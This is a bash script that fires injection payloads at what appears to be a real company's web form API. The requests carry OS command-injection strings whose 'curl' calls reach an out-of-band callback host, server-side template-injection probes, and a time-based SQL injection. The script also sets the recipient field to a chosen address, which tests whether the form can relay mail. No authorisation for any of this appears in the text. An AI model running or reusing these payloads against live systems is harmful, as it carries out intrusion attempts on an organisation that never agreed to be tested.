#!/bin/bash
cd /work
U="https://www.infinitycapital.bh/api/send"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
HCMD=oob360914cfa39d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
O=tool_outputs/send_oracles; mkdir -p $O
send(){ lbl=$1; shift
  code=$(curl -s -o $O/$lbl.body -w "%{http_code}" -A "$UA" -X POST "$U" "$@")
  echo "[$lbl] code=$code size=$(wc -c < $O/$lbl.body) :: $(head -c 200 $O/$lbl.body)"
  sleep 5
}
# use delivered@resend.dev which Resend accepts in test mode
T="delivered@resend.dev"
send t_base --data-urlencode "fname=ICMARKER7" --data-urlencode "lname=Tester" --data-urlencode "areacode=973" --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7" --data-urlencode "msg=ICMARKER7 body"
send t_cmd1 --data-urlencode "fname=A" --data-urlencode "lname=B" --data-urlencode "areacode=973" --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "cname=ICMARKER7" --data-urlencode 'subject=$(curl http://'"$HCMD"'/cmdi1)' --data-urlencode "msg=body"
send t_cmd2 --data-urlencode "fname=A" --data-urlencode "lname=B" --data-urlencode "areacode=973" --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "cname=ICMARKER7" --data-urlencode 'subject=x;curl http://'"$HCMD"'/cmdi2;' --data-urlencode "msg=body"
send t_ssti1 --data-urlencode "fname=A" --data-urlencode "lname=B" --data-urlencode "areacode=973" --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "cname=ICMARKER7" --data-urlencode 'subject=${7*7}' --data-urlencode "msg=body"
send t_ssti2 --data-urlencode "fname=A" --data-urlencode "lname=B" --data-urlencode="areacode=973" --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "cname=ICMARKER7" --data-urlencode 'subject={{7*7}}' --data-urlencode "msg=body"
send t_sql1 --data-urlencode "fname=A" --data-urlencode "lname=B" --data-urlencode "areacode=973" --data-urlencode "tel=3612345" --data-urlencode "check=on" --data-urlencode "targets=$T" --data-urlencode "cname=ICMARKER7" --data-urlencode "subject=ICMARKER7'" --data-urlencode "msg=1' AND SLEEP(5)-- -"
